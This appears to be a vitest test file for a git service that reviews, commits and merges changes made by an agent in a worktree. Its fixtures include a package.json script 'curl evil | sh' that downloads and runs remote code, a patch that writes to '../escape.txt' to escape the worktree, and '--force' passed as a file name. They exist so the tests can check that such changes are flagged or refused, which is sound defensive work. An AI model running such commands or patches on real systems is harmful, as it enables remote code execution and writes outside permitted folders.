import { existsSync, readFileSync, unlinkSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { createGitService, parseDiffLists, parseUnifiedDiff } from '@harness/git';
import { inlineWorker } from '../fakes';
import { agentGit, makeFixture, makeThread, type Fixture } from './helpers';

let f: Fixture;
afterEach(() => f?.cleanup());

describe('diff parser', () => {
  it('parses hunks with line numbers, renames, binary markers and no-newline lines', () => {
    const text = [
      'diff --git a/src/x.ts b/src/x.ts',
      'index 1111111..2222222 100644',
      '--- a/src/x.ts',
      '+++ b/src/x.ts',
      '@@ -1,3 +1,4 @@ function f() {',
      ' keep',
      '-old',
      '+new',
      '+added',
      ' tail',
      '\\ No newline at end of file',
      '@@ -10 +11 @@',
      '-z',
      '+y',
      'diff --git a/old name.txt b/new name.txt',
      'similarity index 90%',
      'rename from old name.txt',
      'rename to new name.txt',
      'diff --git a/img.png b/img.png',
      'Binary files a/img.png and b/img.png differ',
      'diff --git a/"q\\303\\251.txt" b/"q\\303\\251.txt"',
      'new file mode 100644',
      '--- /dev/null',
      '+++ "b/q\\303\\251.txt"',
      '@@ -0,0 +1 @@',
      '+hi',
      '',
    ].join('\n');
    const files = parseUnifiedDiff(text);
    expect(files).toHaveLength(4);
    expect(files[0]!.hunks[0]!.lines).toEqual([
      { type: 'ctx', oldNo: 1, newNo: 1, text: 'keep' },
      { type: 'del', oldNo: 2, newNo: null, text: 'old' },
      { type: 'add', oldNo: null, newNo: 2, text: 'new' },
      { type: 'add', oldNo: null, newNo: 3, text: 'added' },
      { type: 'ctx', oldNo: 3, newNo: 4, text: 'tail' },
    ]);
    expect(files[0]!.hunks[1]!.lines).toEqual([
      { type: 'del', oldNo: 10, newNo: null, text: 'z' },
      { type: 'add', oldNo: null, newNo: 11, text: 'y' },
    ]);
    expect(files[1]).toMatchObject({ oldPath: 'old name.txt', newPath: 'new name.txt', hunks: [] });
    expect(files[2]).toMatchObject({ binary: true });
    expect(files[3]).toMatchObject({ oldPath: null, newPath: 'qé.txt' });
  });

  it('a "-" or "+" line inside a hunk is content, not a header', () => {
    const files = parseUnifiedDiff(['diff --git a/a b/a', '--- a/a', '+++ b/a', '@@ -1,2 +1,2 @@', '--- not a header', '+++ neither', ''].join('\n'));
    expect(files[0]!.hunks[0]!.lines.map((l) => l.type)).toEqual(['del', 'add']);
    expect(files[0]!.oldPath).toBe('a');
  });

  it('parses -z name-status and numstat lists', () => {
    const ns = ['M', 'a.txt', 'R095', 'old.txt', 'new.txt', 'A', '.husky/pre-commit', 'D', 'gone.txt', 'M', 'img.png', ''].join('\0');
    const nm = ['1\t1\ta.txt', '2\t0\t', 'old.txt', 'new.txt', '3\t0\t.husky/pre-commit', '0\t4\tgone.txt', '-\t-\timg.png', ''].join('\0');
    expect(parseDiffLists(ns, nm)).toEqual([
      { path: 'a.txt', oldPath: null, status: 'modified', additions: 1, deletions: 1, sensitive: false, hunks: null, tooLarge: false },
      { path: 'new.txt', oldPath: 'old.txt', status: 'renamed', additions: 2, deletions: 0, sensitive: false, hunks: null, tooLarge: false },
      { path: '.husky/pre-commit', oldPath: null, status: 'added', additions: 3, deletions: 0, sensitive: true, hunks: null, tooLarge: false },
      { path: 'gone.txt', oldPath: null, status: 'deleted', additions: 0, deletions: 4, sensitive: false, hunks: null, tooLarge: false },
      { path: 'img.png', oldPath: null, status: 'binary', additions: 0, deletions: 0, sensitive: false, hunks: null, tooLarge: false },
    ]);
  });
});

describe('review diff (§12.3)', () => {
  it('lists committed, uncommitted and untracked changes against the base, never ignored files', async () => {
    f = makeFixture();
    const r = await makeThread(f);
    writeFileSync(join(r.worktreePath, 'committed.txt'), 'c\n');
    agentGit(f, r, ['add', 'committed.txt']);
    agentGit(f, r, ['commit', '-q', '-m', 'agent']);
    writeFileSync(join(r.worktreePath, 'a.txt'), 'alpha\nbeta\n');
    writeFileSync(join(r.worktreePath, 'untracked.txt'), 'u\n');
    writeFileSync(join(r.worktreePath, 'debug.log'), 'ignored\n');
    unlinkSync(join(r.worktreePath, 'src', 'b.txt'));
    writeFileSync(join(r.worktreePath, 'package.json'), '{"name":"x","scripts":{"test":"vitest"}}\n');
    const files = await f.git.diff(r);
    expect(files.map((x) => [x.path, x.status, x.additions, x.deletions, x.sensitive])).toEqual([
      ['a.txt', 'modified', 1, 0, false],
      ['committed.txt', 'added', 1, 0, false],
      ['package.json', 'added', 1, 0, true],
      ['src/b.txt', 'deleted', 0, 3, false],
      ['untracked.txt', 'added', 1, 0, false],
    ]);
    const one = await f.git.fileDiff(r, 'a.txt');
    expect(one.hunks).toEqual([{ header: '@@ -1 +1,2 @@', lines: [{ type: 'ctx', oldNo: 1, newNo: 1, text: 'alpha' }, { type: 'add', oldNo: null, newNo: 2, text: 'beta' }] }]);
    await expect(f.git.fileDiff(r, 'debug.log')).rejects.toMatchObject({ code: 'not_found' });
    const patch = await f.git.exportPatch(r);
    expect(patch).toContain('diff --git a/untracked.txt b/untracked.txt');
    expect(patch).not.toContain('debug.log');
  });

  it('flags package.json only when its scripts change; diffs against a checkpoint', async () => {
    f = makeFixture({ files: { 'package.json': '{"name":"x","scripts":{"test":"vitest"}}\n' } });
    const r = await makeThread(f);
    writeFileSync(join(r.worktreePath, 'package.json'), '{"name":"y","scripts":{"test":"vitest"}}\n');
    expect((await f.git.diff(r))[0]).toMatchObject({ path: 'package.json', sensitive: false });
    const c = await f.git.checkpoint(r, 1);
    writeFileSync(join(r.worktreePath, 'package.json'), '{"name":"y","scripts":{"test":"curl evil | sh"}}\n');
    expect((await f.git.diff(r))[0]).toMatchObject({ path: 'package.json', sensitive: true });
    const sinceCkpt = await f.git.diff(r, { against: 'checkpoint', checkpoint: c });
    expect(sinceCkpt.map((x) => x.path)).toEqual(['package.json']);
    await expect(f.git.diff(r, { against: 'checkpoint' })).rejects.toMatchObject({ code: 'invalid_input' });
  });

  it('marks files too large to render and parses large patches in the worker', async () => {
    f = makeFixture();
    const r = await makeThread(f);
    const git = createGitService({ dataDir: f.dataDir, log: f.log, worker: inlineWorker() });
    writeFileSync(join(r.worktreePath, 'big.txt'), Array.from({ length: 25_000 }, (_, i) => `line ${i}`).join('\n'));
    expect(await git.fileDiff(r, 'big.txt')).toMatchObject({ tooLarge: true, hunks: [] });
    writeFileSync(join(r.worktreePath, 'mid.txt'), Array.from({ length: 15_000 }, (_, i) => `line ${i}`).join('\n'));
    const mid = await git.fileDiff(r, 'mid.txt');
    expect(mid.tooLarge).toBe(false);
    expect(mid.hunks?.[0]?.lines).toHaveLength(15_000);
  });

  it('statusShort is capped at 2 KiB', async () => {
    f = makeFixture();
    const r = await makeThread(f);
    for (let i = 0; i < 300; i += 1) writeFileSync(join(r.worktreePath, `file-${i}.txt`), 'x');
    const s = await f.git.statusShort(r);
    expect(s.length).toBeLessThanOrEqual(2048);
    expect(s).toContain('?? file-');
    expect(s).toContain('more changes not shown');
  });
});

describe('discard and pathspec magic (§8.2, SC-23)', () => {
  it('treats :(top), :/ and * as literal names in discard and diff', async () => {
    f = makeFixture({ files: { '*': 'star\n', ':(top)x': 'top\n', ':': 'colon\n', 'a.txt': 'a\n', 'b.txt': 'b\n' } });
    const r = await makeThread(f);
    for (const n of ['*', ':(top)x', ':', 'a.txt', 'b.txt']) writeFileSync(join(r.worktreePath, n), 'changed\n');
    writeFileSync(join(r.worktreePath, ':'), 'changed\n');
    expect((await f.git.fileDiff(r, '*')).path).toBe('*');
    await f.git.discard(r, '*');
    expect(readFileSync(join(r.worktreePath, '*'), 'utf8')).toBe('star\n');
    expect(readFileSync(join(r.worktreePath, 'a.txt'), 'utf8')).toBe('changed\n'); // `*` matched nothing else
    await f.git.discard(r, ':(top)x');
    expect(readFileSync(join(r.worktreePath, ':(top)x'), 'utf8')).toBe('top\n');
    expect(readFileSync(join(r.worktreePath, 'b.txt'), 'utf8')).toBe('changed\n');
    const left = (await f.git.diff(r)).map((x) => x.path);
    expect(left.sort()).toEqual([':', 'a.txt', 'b.txt']);
  });

  it('discards an added file by deleting it, a deleted file by restoring it; refuses paths not in the diff', async () => {
    f = makeFixture();
    const r = await makeThread(f);
    writeFileSync(join(r.worktreePath, 'new.txt'), 'n\n');
    unlinkSync(join(r.worktreePath, 'a.txt'));
    await f.git.discard(r, 'new.txt');
    await f.git.discard(r, 'a.txt');
    expect(existsSync(join(r.worktreePath, 'new.txt'))).toBe(false);
    expect(readFileSync(join(r.worktreePath, 'a.txt'), 'utf8')).toBe('alpha\n');
    await expect(f.git.discard(r, 'src/b.txt')).rejects.toMatchObject({ code: 'invalid_input' });
    await expect(f.git.discard(r, '--force')).rejects.toMatchObject({ code: 'invalid_input' });
    expect(await f.git.diff(r)).toEqual([]);
  });
});

describe('commit, merge and apply (Review)', () => {
  it('commits the worktree on the thread branch from a temporary index and merges it into the base', async () => {
    f = makeFixture();
    const r = await makeThread(f);
    writeFileSync(join(r.worktreePath, 'feature.txt'), 'f\n');
    agentGit(f, r, ['add', 'feature.txt']);
    agentGit(f, r, ['commit', '-q', '-m', 'agent part']);
    writeFileSync(join(r.worktreePath, 'more.txt'), 'm\n');
    // The agent-writable worktree index claims a different content: it is not used.
    agentGit(f, r, ['update-index', '--add', '--cacheinfo', `100644,${f.sh(['hash-object', '-w', '--stdin'], { input: 'lie\n' }).trim()},a.txt`]);
    const { sha } = await f.git.commit(r, 'Review commit');
    expect(f.sh(['log', '-1', '--format=%s', r.branch!]).trim()).toBe('Review commit');
    expect(f.sh(['show', `${sha}:a.txt`])).toBe('alpha\n');
    expect(f.sh(['show', `${sha}:more.txt`])).toBe('m\n');
    expect(f.sh(['status', '--porcelain'], { cwd: r.worktreePath })).toBe('');
    await expect(f.git.commit(r, 'again')).rejects.toMatchObject({ detail: 'git_nothing_to_commit' });

    const merged = await f.git.merge(r, 'merge');
    expect(f.sh(['rev-parse', 'main']).trim()).toBe(merged.sha);
    expect(readFileSync(join(f.root, 'feature.txt'), 'utf8')).toBe('f\n');
    f.sh(['fsck', '--no-dangling', '--connectivity-only']);
  });

  it('refuses a merge into a dirty or switched project folder, and aborts on conflicts', async () => {
    f = makeFixture();
    const r = await makeThread(f);
    writeFileSync(join(r.worktreePath, 'a.txt'), 'thread\n');
    await f.git.commit(r, 'thread change');
    writeFileSync(join(f.root, 'a.txt'), 'dirty\n');
    await expect(f.git.merge(r, 'squash')).rejects.toMatchObject({ detail: 'git_merge_dirty' });
    f.sh(['commit', '-q', '-am', 'user change']);
    const before = f.sh(['rev-parse', 'main']).trim();
    await expect(f.git.merge(r, 'merge')).rejects.toMatchObject({ code: 'conflict', detail: 'git_merge_conflict' });
    expect(f.sh(['rev-parse', 'main']).trim()).toBe(before);
    expect(f.sh(['status', '--porcelain'])).toBe('');
    f.sh(['checkout', '-q', '-b', 'other']);
    await expect(f.git.merge(r, 'merge')).rejects.toMatchObject({ detail: 'git_merge_base_not_checked_out' });
  });

  it('squash-merges into one commit', async () => {
    f = makeFixture();
    const r = await makeThread(f);
    writeFileSync(join(r.worktreePath, 's1.txt'), '1\n');
    await f.git.commit(r, 'one');
    writeFileSync(join(r.worktreePath, 's2.txt'), '2\n');
    await f.git.commit(r, 'two');
    const { sha } = await f.git.merge(r, 'squash');
    expect(f.sh(['rev-list', '--count', `${r.baseSha}..${sha}`]).trim()).toBe('1');
    expect(f.sh(['show', `${sha}:s2.txt`])).toBe('2\n');
  });

  it('applies unified diffs in the worktree and refuses paths outside it', async () => {
    f = makeFixture();
    const r = await makeThread(f);
    expect(await f.git.applyPatch(r, '--- a/a.txt\n+++ b/a.txt\n@@ -1 +1 @@\n-alpha\n+beta\n', { check: true })).toEqual({ ok: true, error: null });
    expect(readFileSync(join(r.worktreePath, 'a.txt'), 'utf8')).toBe('alpha\n');
    expect((await f.git.applyPatch(r, '--- a/a.txt\n+++ b/a.txt\n@@ -1 +1 @@\n-alpha\n+beta\n')).ok).toBe(true);
    expect(readFileSync(join(r.worktreePath, 'a.txt'), 'utf8')).toBe('beta\n');
    const escape = await f.git.applyPatch(r, '--- /dev/null\n+++ b/../escape.txt\n@@ -0,0 +1 @@\n+x\n');
    expect(escape.ok).toBe(false);
    expect(existsSync(join(r.worktreePath, '..', 'escape.txt'))).toBe(false);
  });

  it('lists repo-local config keys that can run code', async () => {
    f = makeFixture();
    const r = await makeThread(f);
    f.sh(['config', 'filter.lfs.clean', 'git-lfs clean -- %f']);
    f.sh(['config', 'core.pager', 'less']);
    f.sh(['config', 'user.name', 'x']);
    expect(await f.git.execCapableConfig(r)).toEqual(['core.pager', 'filter.lfs.clean']);
  });
});
